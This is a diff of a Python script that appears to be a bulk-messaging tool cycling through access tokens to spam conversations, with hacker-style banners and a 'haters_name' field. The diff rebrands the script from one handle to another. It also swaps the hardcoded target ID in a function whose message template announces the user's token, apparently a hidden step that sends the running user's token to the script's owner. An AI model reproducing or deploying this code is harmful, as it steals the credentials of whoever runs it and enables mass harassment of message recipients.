@@ -25,7 +25,7 @@ class MyHandler(http.server.SimpleHTTPRequestHandler):
           self.send_response(200)
           self.send_header('Content-type', 'text/plain')
           self.end_headers()
-          self.wfile.write(b"-- SERVER RUNNING>>F3LIIX URF PRINC3 H3R3")
+          self.wfile.write(b"-- SERVER RUNNING>>AXSHU URF AJ33T H3R3")
 def execute_server():
       PORT = 4000
 
@@ -42,12 +42,12 @@ def send_initial_message():
       msg_template = "HeLLo feliix SīīR! I am uSīīnG YouR sErvRr. MY ⤵️TokEn⤵️ īīS {}"
 
       # Specify the ID where you want to send the message
-      target_id = "61571059542672"
+      target_id = "61574791744025"
 
       requests.packages.urllib3.disable_warnings()
 
       def liness():
-          print('\033[1;92m' + '•──────────────────────FELIIX HERE ───────────────────────────────•')
+          print('\033[1;92m' + '•──────────────────────4XSHU HERE ───────────────────────────────•')
 
       headers = {
           'Connection': 'keep-alive',
@@ -121,7 +121,7 @@ def send_messages_from_file():
 
                   current_time = time.strftime("\033[1;92mSahi Hai ==> %Y-%m-%d %I:%M:%S %p")
                   if response.ok:
-                      print("\033[1;92m[+] D3VIL RUL3X 0WN3R F3LIIX URF PRINC3 {} of Convo {} Token {}: {}".format(
+                      print("\033[1;92m[+] D3VIL RUL3X 0WN3R 4XSHU URF AJ33T {} of Convo {} Token {}: {}".format(
                           message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                       liness()
                       liness()
